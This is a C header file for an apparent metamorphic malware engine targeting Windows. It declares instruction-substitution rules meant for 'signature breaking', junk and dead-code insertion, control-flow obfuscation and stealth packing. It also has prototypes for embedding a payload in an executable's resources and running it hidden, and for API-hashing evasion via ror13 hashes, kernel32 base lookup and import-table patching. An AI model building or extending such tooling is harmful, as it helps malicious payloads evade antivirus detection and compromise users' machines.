#ifndef MUTATOR_H
#define MUTATOR_H

#include <stdbool.h>
#include <stdint.h>
#include <windows.h>

#include "cJSON.h"
#include "include/capstone/capstone.h"
#include "include/keystone/keystone.h"

#define MAX_RECORDS 512

// THIS ENUM MUST MATCH ENGINE.C
// typedef enum {
//   TECH_SUBSTITUTION,
//   TECH_DEAD_CODE,
//   TECH_JUNK,
//   TECH_REG_RENAME,
//   TECH_REORDER,
//   TECH_CONTROL_FLOW,
//   TECH_PERMUTATION,
//   TECH_BLOCK_PERMUTE,  // Added this to match your code logic
//   TECH_COUNT
// } Tech;

// Add to your Tech enum in mutator.h
enum Tech {
  TECH_INSTRUCTION_SUBSTITUTION,
  TECH_DEAD_CODE_INSERTION,
  TECH_JUNK_INSERTION,
  TECH_INSTRUCTION_REORDERING,
  TECH_CONTROL_FLOW_OBFUSCATION,
  TECH_CODE_BLOCK_PERMUTATION,
  TECH_REGISTER_RENAMING,
  TECH_STEALTH_PACKING,  // New technique
  TECH_COUNT
};

// Prototypes
bool embed_payload_in_resource(const char* target_exe,
                               const unsigned char* payload, size_t size,
                               int resource_id);
void run_hidden_payload(int resource_id);

typedef struct {
  uint64_t addr;
  int delta;
} RelocRecord;

typedef struct {
  const char* regex_pattern;  // Regex to match the instruction
  const char* tmpl;           // Template for replacement (e.g., "sub %1, %1")
  bool preserve_flags;        // If true, wrap in pushfd/popfd
  int arch;                   // 32 or 64
} MutationRule;

static MutationRule substitution_table[] = {
    // --- 32-BIT PATTERNS (x86) ---

    // 1. Equivalent Logic Swaps
    {"^xor (e..), \\1$", "sub %1, %1", false, 32},
    {"^sub (e..), \\1$", "xor %1, %1", false, 32},
    {"^test (e..), \\1$", "or %1, %1", true, 32},
    {"^or (e..), \\1$", "test %1, %1", true, 32},

    // 2. Data Movement Diversification (The "Stack Swap")
    {"^mov (e..), (e..)$", "push %2; pop %1", false, 32},
    {"^push (e..); pop (e..)$", "mov %2, %1", false, 32},

    // 3. Constant Zeroing Variants (Crucial for signature breaking)
    {"^mov (e..), 0$", "pushfd; xor %1, %1; popfd", false, 32},
    {"^mov (e..), 0$", "pushfd; sub %1, %1; popfd", false, 32},
    {"^mov (e..), 0$", "and %1, 0", true, 32},
    {"^mov (e..), 0$", "push 0; pop %1", false, 32},

    // 4. Increment/Decrement Equivalents
    {"^add (e..), 1$", "inc %1", true, 32},
    {"^sub (e..), 1$", "dec %1", true, 32},
    {"^inc (e..)$", "add %1, 1", true, 32},

    // --- 64-BIT PATTERNS (x64) ---

    // 5. Register Swaps for R8-R15 and Standard Regs
    {"^xor (r..), \\1$", "sub %1, %1", false, 64},
    {"^mov (r..), (r..)$", "push %2; pop %1", false, 64},
    {"^mov (r[0-9]+), (r[0-9]+)$", "push %2; pop %1", false,
     64},  // Extended regs

    // 6. 64-bit Zeroing
    {"^mov (r..), 0$", "pushfq; xor %1, %1; popfq", false, 64},
    {"^mov (r..), 0$", "and %1, 0", true, 64},
    {"^mov (r..), 1$", "pushfq; xor %1, %1; inc %1; popfq", false, 64},

    // 7. NOP Replacements (Python's "Junk" patterns)
    {"^nop$", "xchg eax, eax", false, 32},
    {"^nop$", "xchg rax, rax", false, 64},
    {"^nop$", "pushfd; popfd", false, 32},
    {"^nop$", "pushfq; popfq", false, 64}

    // Note: You can continue adding all 48 variations here...
};

#define RULE_COUNT (sizeof(substitution_table) / sizeof(MutationRule))

typedef struct {
  ks_engine* ks;
  int bits;
  bool debug;
  bool enabled[TECH_COUNT];
  RelocRecord records[MAX_RECORDS];
  int record_count;
} Mutator;

// Lifecycle
Mutator* mut_init(int bits, bool debug, bool* enabled_techs);
void mut_free(Mutator* m);

// Core Logic
cJSON* mut_generate_final(Mutator* m, cJSON* fcn_ctx);

// --- API Hashing Evasion ---
DWORD hash_string(const char* str);
DWORD ror13_hash(const char* str);
HMODULE get_kernel32_base();
FARPROC get_proc_address_by_hash(HMODULE hModule, DWORD targetHash);
FARPROC resolve_api_stilly(HMODULE hModule, DWORD targetHash);
void patch_binary_iat(const char* file_path, const char* api_name);

#endif